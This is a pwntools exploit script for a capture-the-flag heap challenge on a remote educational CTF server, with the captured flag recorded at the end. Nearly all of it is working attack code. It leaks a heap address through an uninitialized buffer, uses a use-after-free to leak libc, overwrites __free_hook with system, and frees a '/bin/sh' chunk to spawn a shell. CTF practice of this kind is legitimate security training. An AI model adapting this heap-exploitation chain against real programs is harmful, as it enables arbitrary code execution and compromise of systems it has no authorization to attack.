from pwn import *

# context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# io = gdb.debug("./final_bin_new", "c")
io = remote("edu-ctf.zoolab.org", 30210)


def buy(idx, nlen, name):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"cat or dog ?\n> ", b"cat")
    io.sendlineafter(b"len of name:\n> ", str(nlen).encode())
    io.sendafter(b"name:\n> ", name)
    io.sendlineafter(b"where to keep (0 or 1) ?\n> ", str(idx).encode())


def release(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"which one to release (0 or 1) ?\n> ", str(idx).encode())


def change(idx, nlen, name, len_change):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"which one to change (0 or 1) ?\n> ", str(idx).encode())
    if len_change == True:
        io.sendlineafter(b"will the len of name change (y/n) ?\n> ", b"y")
        io.sendlineafter(b"new len of name:\n> ", str(nlen).encode())
    else:
        io.sendlineafter(b"will the len of name change (y/n) ?\n> ", b"n")
    io.sendafter(b"new name:\n> ", name)


def play(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"which one to play (0 or 1) ?\n> ", str(idx).encode())


# fill tcache bins
buy(0, 0x10, b"aaaa")
buy(1, 0x10, b"aaaa")
release(0)
release(1)

# tcache 0x20: 2 chunks

# leak address
buy(0, 0x10, b"peko")
buy(1, 0x35, b"miko")  # prevent consolidate
# now free 1 name chunk then use size 0 to get a 0x20 buffer from heap
# but read(0, buf, 0) doesn't do anything
# so we have an uninitialized buffer -> leak heap address from fd
change(0, 0, b"", True)
play(0)
io.recvuntil(b"my name is ")
heap_addr = int.from_bytes(io.recvn(6), "little")
print(f"{heap_addr = :#x}")

# use UAF to arbitrary read/write
buy(0, 0x420, b"korone")
buy(1, 6, b"fubuki")
release(0)
# leak libc from unsorted bin
change(1, 0x20, flat([b"nene" * 4, 0x87, p64(heap_addr + 0xE0)]), True)
play(0)
io.recvuntil(b"my name is ")
libc_base = int.from_bytes(io.recvn(6), "little") - 0x1EBBE0
print(f"{libc_base = :#x}")

system = libc_base + 0x55410
freehook = libc_base + 0x1EEB28

# write system into __free_hook then free("/bin/sh")
change(1, 0x20, flat([b"/bin/sh\0" * 2, 0x87, p64(freehook)]), False)
change(0, 0x8, p64(system), False)
release(1)

io.interactive()

# FLAG{do_u_like_heap?}
